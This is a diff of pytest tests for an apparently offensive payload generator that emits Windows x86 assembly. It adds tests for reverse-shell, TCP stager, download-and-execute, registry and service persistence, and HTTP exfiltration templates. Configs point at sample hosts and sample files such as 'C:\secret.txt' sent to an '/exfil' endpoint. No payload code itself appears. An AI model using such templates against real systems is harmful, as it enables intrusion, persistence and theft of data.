@@ -18,19 +18,25 @@ from emitrion.workflow.reference import (
     build_check_path_workflow,
     build_copy_file_workflow,
     build_copy_then_run_workflow,
-    build_get_username_workflow,
-    build_http_download_workflow,
-    build_move_file_workflow,
     build_move_then_run_workflow,
+    build_registry_persist_workflow,
     build_reverse_shell_workflow,
     build_run_command_workflow,
+    build_service_persist_workflow,
+    build_tcp_stager_workflow,
+    build_tcp_download_workflow,
+    build_http_download_workflow,
+    build_http_exfil_workflow,
     IRCheckPathTemplate,
     IRCopyFileTemplate,
     IRCopyThenRunTemplate,
-    IRGetUsernameTemplate,
-    IRHttpDownloadTemplate,
-    IRMoveFileTemplate,
     IRMoveThenRunTemplate,
+    IRRegistryPersistTemplate,
+    IRServicePersistTemplate,
+    IRTcpStagerTemplate,
+    IRTcpDownloadTemplate,
+    IRHttpDownloadTemplate,
+    IRHttpExfilTemplate,
 )
 
 
@@ -179,6 +185,31 @@ class TestEndToEndBuild:
         )
         assert "WinExec" in result.contract_md
 
+    def test_ir_run_command_build(self, manifest_dir, tmp_path):
+        """Verify ir_run_command template builds correctly."""
+        from emitrion.build import build
+        result = build(
+            str(manifest_dir / "calc.yaml"),
+            template_name="ir_run_command",
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert "WinExec" in result.asm
+        assert "main:" in result.asm
+
+    def test_ir_reverse_shell_build(self, manifest_dir, tmp_path):
+        """Verify ir_reverse_shell template builds correctly."""
+        from emitrion.build import build
+        result = build(
+            str(manifest_dir / "revshell.yaml"),
+            template_name="ir_reverse_shell",
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert "WSAStartup" in result.asm
+        assert "CreateProcessA" in result.asm
 
 
 class TestStructLowering:
@@ -1118,124 +1149,62 @@ class TestExitStrategyAssembly:
 
 
 # ---------------------------------------------------------------------------
-# Move file workflow (standalone)
+# Registry persist workflow
 # ---------------------------------------------------------------------------
 
 
-class TestMoveFileWorkflow:
+class TestRegistryPersistWorkflow:
     def test_workflow_is_valid(self):
         from emitrion.workflow.validator import validate
-        w = build_move_file_workflow()
-        result = validate(w)
-        assert result.valid, result.errors
-
-    def test_workflow_has_three_blocks(self):
-        w = build_move_file_workflow()
-        assert len(w.blocks) == 3
-        names = {b.name for b in w.blocks}
-        assert names == {"entry", "success", "fail"}
-
-
-class TestMoveFileTemplate:
-    def test_probe_slots_finds_apis(self):
-        tmpl = IRMoveFileTemplate()
-        config = TemplateConfig(src_path=r"C:\a.txt", dst_path=r"C:\b.txt")
-        slots = tmpl.probe_slots(config)
-        assert "MoveFileA" in slots
-        assert "ExitProcess" in slots
-
-    def test_probe_slots_finds_strings(self):
-        tmpl = IRMoveFileTemplate()
-        config = TemplateConfig(src_path=r"C:\a.txt", dst_path=r"C:\b.txt")
-        slots = tmpl.probe_slots(config)
-        assert "src_path" in slots
-        assert "dst_path" in slots
-
-
-class TestMoveFileLowering:
-    @pytest.fixture
-    def lowered_asm(self, manifest_dir):
-        from emitrion.build import build
-        result = build(
-            str(manifest_dir / "move_file.yaml"),
-            template_name="ir_move_file",
-            out_dir="/dev/null",
-            assemble=False,
-        )
-        return result.asm
-
-    def test_contains_workflow_labels(self, lowered_asm):
-        assert "wf_entry:" in lowered_asm
-        assert "wf_success:" in lowered_asm
-        assert "wf_fail:" in lowered_asm
-
-    def test_contains_movefile_call(self, lowered_asm):
-        assert "MoveFileA" in lowered_asm
-
-    def test_contains_exit_process(self, lowered_asm):
-        assert "ExitProcess" in lowered_asm
-
-    def test_no_winexec(self, lowered_asm):
-        assert "WinExec" not in lowered_asm
-
-
-class TestMoveFileEndToEnd:
-    def test_build_produces_assembly(self, manifest_dir, tmp_path, monkeypatch):
-        from emitrion.build import build
-        monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
-        result = build(
-            str(manifest_dir / "move_file.yaml"),
-            template_name="ir_move_file",
-            out_dir=str(tmp_path),
-            assemble=False,
-        )
-        assert result.asm
-        assert result.contract_md
-
-
-# ---------------------------------------------------------------------------
-# Get username workflow
-# ---------------------------------------------------------------------------
-
-
-class TestGetUsernameWorkflow:
-    def test_workflow_is_valid(self):
-        from emitrion.workflow.validator import validate
-        w = build_get_username_workflow()
+        w = build_registry_persist_workflow()
         result = validate(w)
         assert result.valid, result.errors
 
     def test_workflow_has_four_blocks(self):
-        w = build_get_username_workflow()
+        w = build_registry_persist_workflow()
         assert len(w.blocks) == 4
         names = {b.name for b in w.blocks}
-        assert names == {"entry", "run_command", "success", "fail"}
+        assert names == {"entry", "set_value", "success", "fail"}
 
 
-class TestGetUsernameTemplate:
+class TestRegistryPersistTemplate:
     def test_probe_slots_finds_apis(self):
-        tmpl = IRGetUsernameTemplate()
-        config = TemplateConfig(command="whoami")
+        tmpl = IRRegistryPersistTemplate()
+        config = TemplateConfig(
+            service_name="TestSvc",
+            dst_path=r"C:\test.exe",
+        )
         slots = tmpl.probe_slots(config)
-        assert "GetUserNameA" in slots
-        assert "LoadLibraryA" in slots
-        assert "WinExec" in slots
+        assert "RegOpenKeyExA" in slots
+        assert "RegSetValueExA" in slots
+        assert "RegCloseKey" in slots
+        assert "ExitProcess" in slots
 
-    def test_probe_slots_finds_structs(self):
-        tmpl = IRGetUsernameTemplate()
+    def test_probe_slots_finds_strings(self):
+        tmpl = IRRegistryPersistTemplate()
+        config = TemplateConfig(
+            service_name="TestSvc",
+            dst_path=r"C:\test.exe",
+        )
+        slots = tmpl.probe_slots(config)
+        assert "reg_subkey" in slots
+        assert "reg_value_name" in slots
+        assert "dst_path" in slots
+
+    def test_probe_slots_finds_local(self):
+        tmpl = IRRegistryPersistTemplate()
         config = TemplateConfig()
-        structs = tmpl.probe_structs(config)
-        assert "username_buf" in structs
-        assert structs["username_buf"] == "CHAR_BUFFER_128"
+        slots = tmpl.probe_slots(config)
+        assert "reg_handle" in slots
 
 
-class TestGetUsernameLowering:
+class TestRegistryPersistLowering:
     @pytest.fixture
     def lowered_asm(self, manifest_dir):
         from emitrion.build import build
         result = build(
-            str(manifest_dir / "get_username.yaml"),
-            template_name="ir_get_username",
+            str(manifest_dir / "ir_registry_persist.yaml"),
+            template_name="ir_registry_persist",
             out_dir="/dev/null",
             assemble=False,
         )
@@ -1243,109 +1212,397 @@ class TestGetUsernameLowering:
 
     def test_contains_workflow_labels(self, lowered_asm):
         assert "wf_entry:" in lowered_asm
-        assert "wf_run_command:" in lowered_asm
+        assert "wf_set_value:" in lowered_asm
+        assert "wf_success:" in lowered_asm
+        assert "wf_fail:" in lowered_asm
 
-    def test_contains_getusername_call(self, lowered_asm):
-        assert "GetUserNameA" in lowered_asm
+    def test_contains_registry_api_calls(self, lowered_asm):
+        assert "RegOpenKeyExA" in lowered_asm
+        assert "RegSetValueExA" in lowered_asm
+        assert "RegCloseKey" in lowered_asm
 
-    def test_contains_loadlibrary_for_advapi(self, lowered_asm):
-        assert "advapi32.dll" in lowered_asm
-        assert "LoadLibraryA" in lowered_asm
-
-    def test_contains_store_local(self, lowered_asm):
-        assert "username_len" in lowered_asm
+    def test_hkcu_handle_encoded(self, lowered_asm):
+        assert "hKey" in lowered_asm or "hkey" in lowered_asm.lower()
 
 
-class TestGetUsernameEndToEnd:
+class TestRegistryPersistEndToEnd:
     def test_build_produces_assembly(self, manifest_dir, tmp_path, monkeypatch):
         from emitrion.build import build
         monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
         result = build(
-            str(manifest_dir / "get_username.yaml"),
-            template_name="ir_get_username",
+            str(manifest_dir / "ir_registry_persist.yaml"),
+            template_name="ir_registry_persist",
             out_dir=str(tmp_path),
             assemble=False,
         )
         assert result.asm
         assert result.contract_md
 
+    def test_cheatsheet_content(self):
+        tmpl = IRRegistryPersistTemplate()
+        config = TemplateConfig(service_name="TestVal", dst_path=r"C:\test.exe")
+        cs = tmpl.cheatsheet(config)
+        labels = [pair[0] for pair in cs]
+        assert "Value name" in labels
+        assert "Binary path on target" in labels
+
 
 # ---------------------------------------------------------------------------
-# HTTP download workflow
+# Service persist workflow
+# ---------------------------------------------------------------------------
+
+
+class TestServicePersistWorkflow:
+    def test_workflow_is_valid(self):
+        from emitrion.workflow.validator import validate
+        w = build_service_persist_workflow()
+        result = validate(w)
+        assert result.valid, result.errors
+
+    def test_workflow_has_seven_blocks(self):
+        w = build_service_persist_workflow()
+        assert len(w.blocks) == 7
+        names = {b.name for b in w.blocks}
+        assert names == {
+            "entry", "create_service", "start_service",
+            "close_scm_ok", "close_scm_fail", "success", "fail",
+        }
+
+
+class TestServicePersistTemplate:
+    def test_probe_slots_finds_apis(self):
+        tmpl = IRServicePersistTemplate()
+        config = TemplateConfig(
+            service_name="TestSvc",
+            dst_path=r"C:\test.exe",
+        )
+        slots = tmpl.probe_slots(config)
+        assert "OpenSCManagerA" in slots
+        assert "CreateServiceA" in slots
+        assert "StartServiceA" in slots
+        assert "CloseServiceHandle" in slots
+        assert "ExitProcess" in slots
+
+    def test_probe_slots_finds_strings(self):
+        tmpl = IRServicePersistTemplate()
+        config = TemplateConfig(
+            service_name="TestSvc",
+            dst_path=r"C:\test.exe",
+        )
+        slots = tmpl.probe_slots(config)
+        assert "service_name" in slots
+        assert "dst_path" in slots
+
+
+class TestServicePersistLowering:
+    @pytest.fixture
+    def lowered_asm(self, manifest_dir):
+        from emitrion.build import build
+        result = build(
+            str(manifest_dir / "ir_service_persist.yaml"),
+            template_name="ir_service_persist",
+            out_dir="/dev/null",
+            assemble=False,
+        )
+        return result.asm
+
+    def test_contains_workflow_labels(self, lowered_asm):
+        assert "wf_entry:" in lowered_asm
+        assert "wf_create_service:" in lowered_asm
+        assert "wf_start_service:" in lowered_asm
+        assert "wf_close_scm_ok:" in lowered_asm
+        assert "wf_close_scm_fail:" in lowered_asm
+        assert "wf_success:" in lowered_asm
+        assert "wf_fail:" in lowered_asm
+
+    def test_contains_service_api_calls(self, lowered_asm):
+        assert "OpenSCManagerA" in lowered_asm
+        assert "CreateServiceA" in lowered_asm
+        assert "StartServiceA" in lowered_asm
+        assert "CloseServiceHandle" in lowered_asm
+
+    def test_service_all_access_encoded(self, lowered_asm):
+        assert "dwDesiredAccess" in lowered_asm
+
+
+class TestServicePersistEndToEnd:
+    def test_build_produces_assembly(self, manifest_dir, tmp_path, monkeypatch):
+        from emitrion.build import build
+        monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
+        result = build(
+            str(manifest_dir / "ir_service_persist.yaml"),
+            template_name="ir_service_persist",
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert result.contract_md
+
+    def test_cheatsheet_content(self):
+        tmpl = IRServicePersistTemplate()
+        config = TemplateConfig(service_name="TestSvc", dst_path=r"C:\test.exe")
+        cs = tmpl.cheatsheet(config)
+        labels = [pair[0] for pair in cs]
+        assert "Service name" in labels
+        assert "Binary path on target" in labels
+
+
+# ---------------------------------------------------------------------------
+# TCP stager workflow
+# ---------------------------------------------------------------------------
+
+
+class TestTcpStagerWorkflow:
+    def test_workflow_is_valid(self):
+        from emitrion.workflow.validator import validate
+        w = build_tcp_stager_workflow()
+        result = validate(w)
+        assert result.valid, result.errors
+
+    def test_workflow_has_expected_blocks(self):
+        w = build_tcp_stager_workflow()
+        names = {b.name for b in w.blocks}
+        assert names == {
+            "entry", "create_socket", "connect_socket", "recv_size",
+            "alloc_buffer", "init_recv", "recv_loop", "accumulate",
+            "recv_done", "fail",
+        }
+
+
+class TestTcpStagerTemplate:
+    def test_probe_slots_finds_apis(self):
+        tmpl = IRTcpStagerTemplate()
+        config = TemplateConfig(lhost="127.0.0.1", lport=4444)
+        slots = tmpl.probe_slots(config)
+        assert "recv" in slots
+        assert "VirtualAlloc" in slots
+        assert "closesocket" in slots
+
+    def test_probe_slots_finds_locals(self):
+        tmpl = IRTcpStagerTemplate()
+        config = TemplateConfig(lhost="127.0.0.1", lport=4444)
+        slots = tmpl.probe_slots(config)
+        assert "bytes_total" in slots
+        assert "bytes_recvd" in slots
+        assert "remaining" in slots
+        assert "recv_buf_ptr" in slots
+        assert "virt_buf" in slots
+
+
+class TestTcpStagerLowering:
+    @pytest.fixture
+    def lowered_asm(self, manifest_dir):
+        from emitrion.build import build
+        result = build(
+            str(manifest_dir / "ir_tcp_stager.yaml"),
+            template_name="ir_tcp_stager",
+            out_dir="/dev/null",
+            assemble=False,
+        )
+        return result.asm
+
+    def test_contains_recv_loop_label(self, lowered_asm):
+        assert "wf_recv_loop:" in lowered_asm
+
+    def test_contains_accumulate_label(self, lowered_asm):
+        assert "wf_accumulate:" in lowered_asm
+
+    def test_contains_recv_done_label(self, lowered_asm):
+        assert "wf_recv_done:" in lowered_asm
+
+    def test_contains_signed_positive_branch(self, lowered_asm):
+        assert "jg " in lowered_asm.lower()
+
+    def test_contains_call_slot(self, lowered_asm):
+        assert "call dword ptr" in lowered_asm
+
+    def test_contains_arith_add(self, lowered_asm):
+        assert "add  ecx, eax" in lowered_asm
+
+    def test_contains_arith_sub(self, lowered_asm):
+        assert "sub  ecx, eax" in lowered_asm
+
+
+class TestTcpStagerEndToEnd:
+    def test_build_produces_assembly(self, manifest_dir, tmp_path, monkeypatch):
+        from emitrion.build import build
+        monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
+        result = build(
+            str(manifest_dir / "ir_tcp_stager.yaml"),
+            template_name="ir_tcp_stager",
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert result.contract_md
+
+    def test_cheatsheet_content(self):
+        tmpl = IRTcpStagerTemplate()
+        config = TemplateConfig(lhost="127.0.0.1", lport=9001)
+        cs = tmpl.cheatsheet(config)
+        labels = [pair[0] for pair in cs]
+        assert "Protocol" in labels
+
+
+# ---------------------------------------------------------------------------
+# TCP download workflow
+# ---------------------------------------------------------------------------
+
+
+class TestTcpDownloadWorkflow:
+    def test_workflow_is_valid(self):
+        from emitrion.workflow.validator import validate
+        w = build_tcp_download_workflow()
+        result = validate(w)
+        assert result.valid, result.errors
+
+    def test_workflow_has_expected_blocks(self):
+        w = build_tcp_download_workflow()
+        names = {b.name for b in w.blocks}
+        assert names == {
+            "entry", "create_socket", "connect_socket", "recv_size",
+            "alloc_buffer", "init_recv", "recv_loop", "accumulate",
+            "recv_done", "write_file", "do_write", "exec_payload",
+            "success", "fail",
+        }
+
+
+class TestTcpDownloadTemplate:
+    def test_probe_slots_finds_file_apis(self):
+        tmpl = IRTcpDownloadTemplate()
+        config = TemplateConfig(lhost="127.0.0.1", lport=4444)
+        slots = tmpl.probe_slots(config)
+        assert "CreateFileA" in slots
+        assert "WriteFile" in slots
+        assert "CloseHandle" in slots
+        assert "WinExec" in slots
+
+    def test_probe_slots_finds_network_apis(self):
+        tmpl = IRTcpDownloadTemplate()
+        config = TemplateConfig(lhost="127.0.0.1", lport=4444)
+        slots = tmpl.probe_slots(config)
+        assert "recv" in slots
+        assert "VirtualAlloc" in slots
+
+
+class TestTcpDownloadLowering:
+    @pytest.fixture
+    def lowered_asm(self, manifest_dir):
+        from emitrion.build import build
+        result = build(
+            str(manifest_dir / "ir_tcp_download.yaml"),
+            template_name="ir_tcp_download",
+            out_dir="/dev/null",
+            assemble=False,
+        )
+        return result.asm
+
+    def test_contains_write_file_label(self, lowered_asm):
+        assert "wf_write_file:" in lowered_asm
+
+    def test_contains_exec_payload_label(self, lowered_asm):
+        assert "wf_exec_payload:" in lowered_asm
+
+    def test_contains_recv_loop(self, lowered_asm):
+        assert "wf_recv_loop:" in lowered_asm
+
+    def test_contains_create_file_call(self, lowered_asm):
+        assert "CreateFileA" in lowered_asm
+
+
+class TestTcpDownloadEndToEnd:
+    def test_build_produces_assembly(self, manifest_dir, tmp_path, monkeypatch):
+        from emitrion.build import build
+        monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
+        result = build(
+            str(manifest_dir / "ir_tcp_download.yaml"),
+            template_name="ir_tcp_download",
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert result.contract_md
+
+    def test_cheatsheet_content(self):
+        tmpl = IRTcpDownloadTemplate()
+        config = TemplateConfig(lhost="127.0.0.1", lport=9001,
+                                dst_path=r"C:\test.exe")
+        cs = tmpl.cheatsheet(config)
+        labels = [pair[0] for pair in cs]
+        assert "Protocol" in labels
+        assert "Written to" in labels
+
+
+# ---------------------------------------------------------------------------
+# HTTP download workflow tests
 # ---------------------------------------------------------------------------
 
 
 class TestHttpDownloadWorkflow:
     def test_workflow_is_valid(self):
-        from emitrion.workflow.validator import validate
-        w = build_http_download_workflow()
-        result = validate(w)
-        assert result.valid, result.errors
+        wf = build_http_download_workflow()
+        assert wf.name == "ir_http_download"
 
-    def test_workflow_block_count(self):
-        w = build_http_download_workflow()
-        names = {b.name for b in w.blocks}
+    def test_workflow_has_expected_blocks(self):
+        wf = build_http_download_workflow()
+        names = [b.name for b in wf.blocks]
         assert "entry" in names
-        assert "open_url" in names
-        assert "alloc_buffer" in names
         assert "read_loop" in names
-        assert "close_handles" in names
+        assert "check_eof" in names
         assert "write_file" in names
-        assert "do_write" in names
-        assert "exec_payload" in names
 
 
 class TestHttpDownloadTemplate:
-    def test_probe_slots_finds_apis(self):
+    def test_probe_slots_includes_wininet_apis(self):
         tmpl = IRHttpDownloadTemplate()
-        config = TemplateConfig(url="http://10.0.0.1/test.exe")
+        config = TemplateConfig()
         slots = tmpl.probe_slots(config)
         assert "InternetOpenA" in slots
         assert "InternetOpenUrlA" in slots
         assert "InternetReadFile" in slots
         assert "InternetCloseHandle" in slots
-        assert "VirtualAlloc" in slots
-        assert "CreateFileA" in slots
-        assert "WriteFile" in slots
-        assert "WinExec" in slots
 
-    def test_probe_strings_finds_url(self):
+    def test_probe_strings_includes_url(self):
         tmpl = IRHttpDownloadTemplate()
-        config = TemplateConfig(url="http://10.0.0.1/payload.bin")
+        config = TemplateConfig(url="http://test/payload.exe")
         strings = tmpl.probe_strings(config)
         assert "url" in strings
-        assert strings["url"] == "http://10.0.0.1/payload.bin"
+        assert "user_agent" in strings
+        assert "dst_path" in strings
 
 
 class TestHttpDownloadLowering:
-    @pytest.fixture
-    def lowered_asm(self, manifest_dir):
+    def test_lowered_asm_contains_read_loop(self, revshell_layout):
+        from emitrion.schema import load
+        from emitrion.stack_alloc import build_layout
+        from emitrion.workflow.x86_backend import lower_workflow
+
+        wf = build_http_download_workflow()
+        tmpl = IRHttpDownloadTemplate()
+        config = TemplateConfig(
+            url="http://192.168.1.100/payload.exe",
+            dst_path=r"C:\Windows\Temp\payload.exe",
+        )
+
         from emitrion.build import build
         result = build(
-            str(manifest_dir / "http_download.yaml"),
+            "emitrion/manifests/ir_http_download.yaml",
             template_name="ir_http_download",
             out_dir="/dev/null",
             assemble=False,
         )
-        return result.asm
+        assert "wf_read_loop:" in result.asm
+        assert "wf_check_eof:" in result.asm
+        assert "; InternetReadFile" in result.asm
 
-    def test_contains_workflow_labels(self, lowered_asm):
-        assert "wf_entry:" in lowered_asm
-        assert "wf_open_url:" in lowered_asm
-        assert "wf_read_loop:" in lowered_asm
-        assert "wf_write_file:" in lowered_asm
-
-    def test_contains_wininet_calls(self, lowered_asm):
-        assert "InternetOpenA" in lowered_asm
-        assert "InternetOpenUrlA" in lowered_asm
-        assert "InternetReadFile" in lowered_asm
-
-    def test_contains_file_write(self, lowered_asm):
-        assert "CreateFileA" in lowered_asm
-        assert "WriteFile" in lowered_asm
-
-    def test_contains_winexec(self, lowered_asm):
-        assert "WinExec" in lowered_asm
+    def test_exit_strategy_terminate_process(self):
+        from emitrion.workflow.ir import ExitStrategy
+        wf = build_http_download_workflow(
+            exit_strategy=ExitStrategy.TERMINATE_PROCESS,
+        )
+        block_names = [b.name for b in wf.blocks]
+        assert "success" in block_names
+        assert "fail" in block_names
 
 
 class TestHttpDownloadEndToEnd:
@@ -1353,11 +1610,117 @@ class TestHttpDownloadEndToEnd:
         from emitrion.build import build
         monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
         result = build(
-            str(manifest_dir / "http_download.yaml"),
+            str(manifest_dir / "ir_http_download.yaml"),
             template_name="ir_http_download",
             out_dir=str(tmp_path),
             assemble=False,
         )
         assert result.asm
         assert result.contract_md
-        assert "wininet.dll" in result.asm
+
+    def test_cheatsheet_content(self):
+        tmpl = IRHttpDownloadTemplate()
+        config = TemplateConfig(
+            lhost="192.168.1.100", lport=8000,
+            url="http://192.168.1.100:8000/payload.exe",
+            dst_path=r"C:\test.exe",
+        )
+        cs = tmpl.cheatsheet(config)
+        labels = [pair[0] for pair in cs]
+        assert "URL fetched" in labels
+        assert "Written to" in labels
+
+
+# ---------------------------------------------------------------------------
+# HTTP exfil workflow tests
+# ---------------------------------------------------------------------------
+
+
+class TestHttpExfilWorkflow:
+    def test_workflow_is_valid(self):
+        wf = build_http_exfil_workflow()
+        assert wf.name == "ir_http_exfil"
+
+    def test_workflow_has_expected_blocks(self):
+        wf = build_http_exfil_workflow()
+        names = [b.name for b in wf.blocks]
+        assert "entry" in names
+        assert "read_loop" in names
+        assert "inet_open" in names
+        assert "inet_connect" in names
+        assert "http_open" in names
+        assert "http_send" in names
+
+
+class TestHttpExfilTemplate:
+    def test_probe_slots_includes_wininet_and_file_apis(self):
+        tmpl = IRHttpExfilTemplate()
+        config = TemplateConfig()
+        slots = tmpl.probe_slots(config)
+        assert "CreateFileA" in slots
+        assert "ReadFile" in slots
+        assert "InternetOpenA" in slots
+        assert "InternetConnectA" in slots
+        assert "HttpOpenRequestA" in slots
+        assert "HttpSendRequestA" in slots
+
+    def test_probe_strings_includes_exfil_strings(self):
+        tmpl = IRHttpExfilTemplate()
+        config = TemplateConfig(
+            src_path=r"C:\test.txt",
+            lhost="10.0.0.1",
+            url_path="/upload",
+        )
+        strings = tmpl.probe_strings(config)
+        assert "src_path" in strings
+        assert "exfil_host" in strings
+        assert "url_path" in strings
+        assert "http_post" in strings
+
+
+class TestHttpExfilLowering:
+    def test_lowered_asm_contains_read_and_post(self):
+        from emitrion.build import build
+        result = build(
+            "emitrion/manifests/ir_http_exfil.yaml",
+            template_name="ir_http_exfil",
+            out_dir="/dev/null",
+            assemble=False,
+        )
+        assert "wf_read_loop:" in result.asm
+        assert "wf_http_send:" in result.asm
+        assert "; HttpSendRequestA" in result.asm
+
+    def test_exit_strategy_thread_only(self):
+        from emitrion.workflow.ir import ExitStrategy
+        wf = build_http_exfil_workflow(
+            exit_strategy=ExitStrategy.THREAD_ONLY,
+        )
+        block_names = [b.name for b in wf.blocks]
+        assert "success" in block_names
+
+
+class TestHttpExfilEndToEnd:
+    def test_build_produces_assembly(self, manifest_dir, tmp_path, monkeypatch):
+        from emitrion.build import build
+        monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
+        result = build(
+            str(manifest_dir / "ir_http_exfil.yaml"),
+            template_name="ir_http_exfil",
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert result.contract_md
+
+    def test_cheatsheet_content(self):
+        tmpl = IRHttpExfilTemplate()
+        config = TemplateConfig(
+            lhost="192.168.1.100", lport=8080,
+            src_path=r"C:\secret.txt",
+            url_path="/exfil",
+        )
+        cs = tmpl.cheatsheet(config)
+        labels = [pair[0] for pair in cs]
+        assert "Source file on target" in labels
+        assert "POST endpoint" in labels
